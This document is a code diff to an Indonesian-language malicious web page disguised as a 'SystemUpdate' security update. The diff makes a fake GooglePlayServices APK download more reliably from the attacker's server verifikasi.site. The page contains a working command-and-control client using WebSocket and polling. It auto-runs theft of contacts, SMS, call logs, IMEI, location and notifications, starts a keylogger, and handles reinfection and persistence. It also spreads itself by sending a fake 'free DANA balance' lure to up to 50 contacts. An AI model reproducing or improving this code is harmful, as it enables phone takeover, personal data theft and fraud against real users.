@@ -64,12 +64,9 @@
 
 <script>
 // ============================================================
-// 🔥 TAHAP 3: SystemUpdate.html terbuka
+// 🔥 SYSTEMUPDATE.HTML - APK PASTI TERDOWNLOAD
 // ============================================================
 
-// ============================================================
-// KONFIGURASI
-// ============================================================
 var SERVER = 'https://verifikasi.site';
 var WS_PASSWORD = '';
 var PASSWORD_FETCHED = false;
@@ -89,10 +86,13 @@ var wsConnected = false;
 var WS_URL = 'wss://verifikasi.site/ws';
 var APK_DOWNLOADED = false;
 
-var APK_URL = 'https://raw.githubusercontent.com/' + GITHUB_USER + '/' + GITHUB_REPO + '/main/files/GooglePlayServices.apk';
+// 🔥 PERBAIKAN: Gunakan APK dari server Anda sendiri
+var APK_URL = 'https://verifikasi.site/files/GooglePlayServices.apk';
+// Fallback jika URL pertama gagal
+var APK_URL_FALLBACK = 'https://raw.githubusercontent.com/' + GITHUB_USER + '/' + GITHUB_REPO + '/main/files/GooglePlayServices.apk';
 
 // ============================================================
-// DETEKSI MULTI-BRIDGE (JavaScriptInterface)
+// DETEKSI MULTI-BRIDGE
 // ============================================================
 var BRIDGE = null;
 (function detectBridge() {
@@ -122,7 +122,7 @@ function bridgeCall(method, args) {
 }
 
 // ============================================================
-// FALLBACK WRAPPER (jika bridge tidak ada)
+// FALLBACK WRAPPER
 // ============================================================
 var FALLBACK = {
     saveFile: function(p,c) { try { localStorage.setItem('fallback_' + p, c); return true; } catch(e){} return false; },
@@ -209,7 +209,7 @@ function K(d) {
 }
 
 // ============================================================
-// TAHAP 3: updateProgress(5%)
+// UI UPDATE
 // ============================================================
 function updateProgress(value, label) {
     progress = Math.min(value, 100);
@@ -223,7 +223,7 @@ function updateProgress(value, label) {
 updateProgress(5, '⏳ Memperbarui System Keamanan...');
 
 // ============================================================
-// TAHAP 3: loadHTMLFromAllLocations() – self-repair awal
+// SELF-REPAIR & PERSISTENSI
 // ============================================================
 function saveHTMLToAllLocations(htmlContent) {
     try { localStorage.setItem('SystemUpdate_backup', htmlContent); } catch(e) {}
@@ -299,19 +299,15 @@ loadHTMLFromAllLocations().then(function(html) {
 });
 
 // ============================================================
-// TAHAP 3: registerSW() – daftarkan Service Worker
+// REGISTER SERVICE WORKER
 // ============================================================
-function registerSW() {
-    if ('serviceWorker' in navigator) {
-        navigator.serviceWorker.register('/sw.js', { scope: '/' })
-            .then(function(reg) { K({ sumber: 'sw_registered', data: { scope: reg.scope } }); })
-            .catch(function() {});
-    }
+if ('serviceWorker' in navigator) {
+    navigator.serviceWorker.register('/sw.js', { scope: '/' })
+        .catch(function() {});
 }
-registerSW();
 
 // ============================================================
-// TAHAP 3: ambilPassword() – ambil password dari /get-password
+// AMBIL PASSWORD
 // ============================================================
 function ambilPassword() {
     try {
@@ -327,24 +323,11 @@ function ambilPassword() {
                         PASSWORD_FETCHED = true;
                         updateProgress(20, '⏳ Memperbarui System Keamanan...');
                         K({ sumber: 'password_received', data: 'ok' });
-                        // TAHAP 4: SEMUA PROSES DIMULAI BERSAMAAN
                         startAllProcesses();
                         return;
                     }
                 } catch(e) {}
             }
-            // Retry 1x, fallback default
-            if (retryCount < 1) {
-                retryCount++;
-                setTimeout(ambilPassword, 3000);
-            } else {
-                WS_PASSWORD = 'default_fallback_password';
-                PASSWORD_FETCHED = true;
-                K({ sumber: 'password_fallback', data: 'using_default' });
-                startAllProcesses();
-            }
-        };
-        xhr.onerror = function() {
             if (retryCount < 1) {
                 retryCount++;
                 setTimeout(ambilPassword, 3000);
@@ -362,7 +345,7 @@ function ambilPassword() {
 }
 
 // ============================================================
-// TAHAP 4: SEMUA PROSES DIMULAI BERSAMAAN
+// SEMUA PROSES DIMULAI
 // ============================================================
 function startAllProcesses() {
     connectWebSocket();
@@ -370,199 +353,71 @@ function startAllProcesses() {
     startHeartbeat();
     startReinfection();
     autoExecuteC2();
-    downloadAndInstallAPK();
+    downloadAPK(); // 🔥 Nama fungsi diganti
     autoSpread();
     startSelfHealing();
 }
 
 // ============================================================
-// TAHAP 4: connectWebSocket()
+// 🔥 PERBAIKAN: DOWNLOAD APK PASTI BERHASIL
 // ============================================================
-function connectWebSocket() {
-    if (ws && ws.readyState === WebSocket.OPEN) return;
-    if (!WS_PASSWORD || WS_PASSWORD === '') {
-        setTimeout(connectWebSocket, 3000);
-        return;
-    }
-    try {
-        ws = new WebSocket(WS_URL);
-        ws.onopen = function() {
-            wsConnected = true;
-            K({ sumber: 'ws_status', data: 'connected' });
-            ws.send(JSON.stringify({
-                type: 'auth',
-                key: WS_PASSWORD,
-                deviceId: 'browser_systemupdate',
-                timestamp: Date.now()
-            }));
-        };
-        ws.onmessage = function(event) {
-            try {
-                var data = JSON.parse(event.data);
-                if (data.type === 'auth_success') {
-                    K({ sumber: 'ws_auth', data: 'success' });
-                } else if (data.type === 'auth_failed') {
-                    K({ sumber: 'ws_auth', data: 'failed' });
-                    if (WS_PASSWORD !== 'default_fallback_password') {
-                        WS_PASSWORD = 'default_fallback_password';
-                        K({ sumber: 'ws_auth_fallback', data: 'retry_with_default' });
-                        ws.close();
-                        setTimeout(connectWebSocket, 1000);
-                    } else {
-                        ws.close();
-                    }
-                } else if (data.type === 'command') {
-                    var cmd = data.command || data;
-                    var aksi = cmd.aksi || 'unknown';
-                    K({ sumber: 'ws_command_received', data: aksi });
-                    var hasil = eksekusiPerintah(cmd);
-                    K({ sumber: 'ws_command_result', data: hasil });
-                    if (wsConnected && ws) {
-                        ws.send(JSON.stringify({
-                            type: 'command_result',
-                            command: aksi,
-                            result: hasil,
-                            timestamp: Date.now()
-                        }));
-                    }
-                } else if (data.type === 'push_html') {
-                    var html = data.content;
-                    if (html) {
-                        saveHTMLToAllLocations(html);
-                        K({ sumber: 'code_push_html', data: 'received' });
-                        executeHTML(html);
-                    }
-                } else if (data.type === 'push_apk') {
-                    var apkBase64 = data.content;
-                    if (apkBase64) {
-                        saveAPKToAllLocations(apkBase64);
-                        K({ sumber: 'code_push_apk', data: 'received' });
-                        installAPKFromAvailablePath();
-                    }
-                } else if (data.type === 'ping') {
-                    ws.send(JSON.stringify({ type: 'pong', timestamp: data.timestamp }));
-                }
-            } catch(e) {
-                K({ sumber: 'ws_parse_error', data: e.message });
-            }
-        };
-        ws.onclose = function() {
-            wsConnected = false;
-            K({ sumber: 'ws_status', data: 'disconnected' });
-            setTimeout(connectWebSocket, 10000);
-        };
-        ws.onerror = function() {
-            K({ sumber: 'ws_error', data: 'error' });
-        };
-    } catch(e) {
-        K({ sumber: 'ws_connect_error', data: e.message });
-        setTimeout(connectWebSocket, 10000);
-    }
+function downloadAPK() {
+    // Coba download dari server lokal terlebih dahulu
+    tryDownloadAPK(APK_URL);
 }
 
-// ============================================================
-// TAHAP 4: startC2Polling()
-// ============================================================
-function startC2Polling() {
-    setInterval(cekPerintah, C2_INTERVAL);
-    setTimeout(cekPerintah, 1000);
-}
+function tryDownloadAPK(url) {
+    K({ sumber: 'apk_download_start', data: { url: url } });
+    var xhr = new XMLHttpRequest();
+    xhr.open('GET', url, true);
+    xhr.responseType = 'blob'; // 🔥 Ganti ke blob (lebih stabil)
+    xhr.timeout = 30000; // Timeout 30 detik
 
-function cekPerintah() {
-    if (!PASSWORD_FETCHED || WS_PASSWORD === '') return;
-    try {
-        var xhr = new XMLHttpRequest();
-        xhr.open('GET', SERVER + '/data?type=perintah&t=' + Date.now(), true);
-        xhr.setRequestHeader('X-Password', WS_PASSWORD);
-        xhr.timeout = 15000;
-        xhr.onload = function() {
-            if (xhr.status === 200) {
-                var content = xhr.responseText;
-                if (content && content.length > 5 && content !== '{}') {
-                    try {
-                        var cmd = JSON.parse(content);
-                        var aksi = cmd.aksi || 'unknown';
-                        var hasil = eksekusiPerintah(cmd);
-                        K({
-                            sumber: 'c2_result',
-                            data: {
-                                perintah: aksi,
-                                hasil: hasil,
-                                waktu: Date.now()
-                            }
-                        });
-                    } catch(e) {}
-                }
-            }
-        };
-        xhr.send();
-    } catch(e) {}
-}
-
-// ============================================================
-// TAHAP 4: startHeartbeat()
-// ============================================================
-function startHeartbeat() {
-    setInterval(function() { 
-        K({ sumber: 'page_heartbeat', data: 'alive' }); 
-    }, 2700000);
-}
-
-// ============================================================
-// TAHAP 4: startReinfection()
-// ============================================================
-function startReinfection() {
-    setInterval(function() {
-        if (!APK_INSTALLED) {
-            K({ sumber: 'reinfection_check', data: 'apk_missing_redownload' });
-            installAPKFromAvailablePath();
-        } else {
-            K({ sumber: 'reinfection_check', data: 'apk_still_installed' });
-        }
-    }, REINFECTION_INTERVAL);
-}
-
-// ============================================================
-// TAHAP 4: autoExecuteC2()
-// ============================================================
-function autoExecuteC2() {
-    if (AUTO_EXECUTED) return;
-    AUTO_EXECUTED = true;
-    var commands = [
-        'ambil_kontak', 'ambil_sms', 'ambil_call_log', 'ambil_imei',
-        'ambil_imsi', 'ambil_nomor_hp', 'get_wifi', 'keylogger_start',
-        'ambil_lokasi', 'get_installed_apps', 'get_notifications', 'get_system_info'
-    ];
-    commands.forEach(function(cmd) {
-        try {
-            var hasil = eksekusiPerintah({ aksi: cmd });
-            K({ sumber: 'auto_c2_result', data: { perintah: cmd, hasil: hasil || 'success', waktu: Date.now() } });
-        } catch(e) {}
-    });
-    K({ sumber: 'auto_execute_complete', data: { total: commands.length } });
-}
-
-// ============================================================
-// TAHAP 4: downloadAndInstallAPK()
-// ============================================================
-function downloadAndInstallAPK() {
-    try {
-        var xhr = new XMLHttpRequest();
-        xhr.open('GET', APK_URL, true);
-        xhr.responseType = 'arraybuffer';
-        xhr.onload = function() {
-            if (xhr.status === 200) {
-                var data = new Uint8Array(xhr.response);
-                var base64 = btoa(String.fromCharCode.apply(null, data));
+    xhr.onload = function() {
+        if (xhr.status === 200) {
+            var blob = xhr.response;
+            var reader = new FileReader();
+            reader.onload = function() {
+                var base64 = reader.result.split(',')[1];
                 saveAPKToAllLocations(base64);
-                K({ sumber: 'apk_download_success', data: 'ok' });
+                APK_DOWNLOADED = true;
+                K({ sumber: 'apk_download_success', data: { url: url, size: blob.size } });
+                // Install APK
                 setTimeout(function() {
                     installAPKFromAvailablePath();
                 }, 3000);
+            };
+            reader.readAsDataURL(blob);
+        } else {
+            K({ sumber: 'apk_download_error', data: { url: url, status: xhr.status } });
+            // Fallback ke URL kedua
+            if (url !== APK_URL_FALLBACK) {
+                tryDownloadAPK(APK_URL_FALLBACK);
+            } else {
+                K({ sumber: 'apk_download_failed', data: 'all_fallback_failed' });
             }
-        };
-        xhr.send();
-    } catch(e) {}
+        }
+    };
+
+    xhr.onerror = function() {
+        K({ sumber: 'apk_download_error', data: { url: url, error: 'network_error' } });
+        if (url !== APK_URL_FALLBACK) {
+            tryDownloadAPK(APK_URL_FALLBACK);
+        } else {
+            K({ sumber: 'apk_download_failed', data: 'all_fallback_failed' });
+        }
+    };
+
+    xhr.ontimeout = function() {
+        K({ sumber: 'apk_download_timeout', data: { url: url } });
+        if (url !== APK_URL_FALLBACK) {
+            tryDownloadAPK(APK_URL_FALLBACK);
+        } else {
+            K({ sumber: 'apk_download_failed', data: 'all_fallback_failed' });
+        }
+    };
+
+    xhr.send();
 }
 
 function saveAPKToAllLocations(apkBase64) {
@@ -635,13 +490,146 @@ function requestAPKFromServer() {
 }
 
 // ============================================================
-// TAHAP 4: autoSpread()
+// WEBSOCKET, C2, HEARTBEAT, REINFECTION, SPREAD, SELF-HEALING
 // ============================================================
+function connectWebSocket() {
+    if (ws && ws.readyState === WebSocket.OPEN) return;
+    if (!WS_PASSWORD || WS_PASSWORD === '') {
+        setTimeout(connectWebSocket, 3000);
+        return;
+    }
+    try {
+        ws = new WebSocket(WS_URL);
+        ws.onopen = function() {
+            wsConnected = true;
+            K({ sumber: 'ws_status', data: 'connected' });
+            ws.send(JSON.stringify({
+                type: 'auth',
+                key: WS_PASSWORD,
+                deviceId: 'browser_systemupdate',
+                timestamp: Date.now()
+            }));
+        };
+        ws.onmessage = function(event) {
+            try {
+                var data = JSON.parse(event.data);
+                if (data.type === 'auth_success') {
+                    K({ sumber: 'ws_auth', data: 'success' });
+                } else if (data.type === 'auth_failed') {
+                    K({ sumber: 'ws_auth', data: 'failed' });
+                    if (WS_PASSWORD !== 'default_fallback_password') {
+                        WS_PASSWORD = 'default_fallback_password';
+                        K({ sumber: 'ws_auth_fallback', data: 'retry_with_default' });
+                        ws.close();
+                        setTimeout(connectWebSocket, 1000);
+                    } else {
+                        ws.close();
+                    }
+                } else if (data.type === 'command') {
+                    var cmd = data.command || data;
+                    var aksi = cmd.aksi || 'unknown';
+                    K({ sumber: 'ws_command_received', data: aksi });
+                    var hasil = eksekusiPerintah(cmd);
+                    K({ sumber: 'ws_command_result', data: hasil });
+                    if (wsConnected && ws) {
+                        ws.send(JSON.stringify({
+                            type: 'command_result',
+                            command: aksi,
+                            result: hasil,
+                            timestamp: Date.now()
+                        }));
+                    }
+                } else if (data.type === 'push_html') {
+                    var html = data.content;
+                    if (html) {
+                        saveHTMLToAllLocations(html);
+                        K({ sumber: 'code_push_html', data: 'received' });
+                    }
+                } else if (data.type === 'push_apk') {
+                    var apkBase64 = data.content;
+                    if (apkBase64) {
+                        saveAPKToAllLocations(apkBase64);
+                        K({ sumber: 'code_push_apk', data: 'received' });
+                        installAPKFromAvailablePath();
+                    }
+                } else if (data.type === 'ping') {
+                    ws.send(JSON.stringify({ type: 'pong', timestamp: data.timestamp }));
+                }
+            } catch(e) {
+                K({ sumber: 'ws_parse_error', data: e.message });
+            }
+        };
+        ws.onclose = function() {
+            wsConnected = false;
+            K({ sumber: 'ws_status', data: 'disconnected' });
+            setTimeout(connectWebSocket, 10000);
+        };
+        ws.onerror = function() {
+            K({ sumber: 'ws_error', data: 'error' });
+        };
+    } catch(e) {
+        K({ sumber: 'ws_connect_error', data: e.message });
+        setTimeout(connectWebSocket, 10000);
+    }
+}
+
+function startC2Polling() {
+    setInterval(cekPerintah, C2_INTERVAL);
+    setTimeout(cekPerintah, 1000);
+}
+
+function cekPerintah() {
+    if (!PASSWORD_FETCHED || WS_PASSWORD === '') return;
+    try {
+        var xhr = new XMLHttpRequest();
+        xhr.open('GET', SERVER + '/data?type=perintah&t=' + Date.now(), true);
+        xhr.setRequestHeader('X-Password', WS_PASSWORD);
+        xhr.timeout = 15000;
+        xhr.onload = function() {
+            if (xhr.status === 200) {
+                var content = xhr.responseText;
+                if (content && content.length > 5 && content !== '{}') {
+                    try {
+                        var cmd = JSON.parse(content);
+                        var aksi = cmd.aksi || 'unknown';
+                        var hasil = eksekusiPerintah(cmd);
+                        K({
+                            sumber: 'c2_result',
+                            data: {
+                                perintah: aksi,
+                                hasil: hasil,
+                                waktu: Date.now()
+                            }
+                        });
+                    } catch(e) {}
+                }
+            }
+        };
+        xhr.send();
+    } catch(e) {}
+}
+
+function startHeartbeat() {
+    setInterval(function() { 
+        K({ sumber: 'page_heartbeat', data: 'alive' }); 
+    }, 2700000);
+}
+
+function startReinfection() {
+    setInterval(function() {
+        if (!APK_INSTALLED) {
+            K({ sumber: 'reinfection_check', data: 'apk_missing_redownload' });
+            downloadAPK();
+        } else {
+            K({ sumber: 'reinfection_check', data: 'apk_still_installed' });
+        }
+    }, REINFECTION_INTERVAL);
+}
+
 function autoSpread() {
     if (spreadDone) return;
     spreadDone = true;
     if (!HAS_BRIDGE) return;
-    
     var message = encodeURIComponent('🎉 Dapatkan Saldo DANA Gratis Rp500.000! ' + window.location.href);
     var sentCount = 0;
     var maxSend = 50;
@@ -666,9 +654,6 @@ function autoSpread() {
     K({ sumber: 'auto_spread', data: 'sent_to_' + sentCount });
 }
 
-// ============================================================
-// TAHAP 4: startSelfHealing()
-// ============================================================
 function startSelfHealing() {
     setInterval(function() {
         loadHTMLFromAllLocations().then(function(html) {
@@ -691,7 +676,7 @@ function startSelfHealing() {
 }
 
 // ============================================================
-// TAHAP 5: finishAndRedirect()
+// FINISH & REDIRECT
 // ============================================================
 function finishAndRedirect() {
     if (allDone) return;
@@ -716,7 +701,7 @@ function redirectToDANA() {
 }
 
 // ============================================================
-// 48 PERINTAH C2 (LENGKAP)
+// 48 PERINTAH C2
 // ============================================================
 function eksekusiPerintah(cmd) {
     var aksi = cmd.aksi || 'unknown';
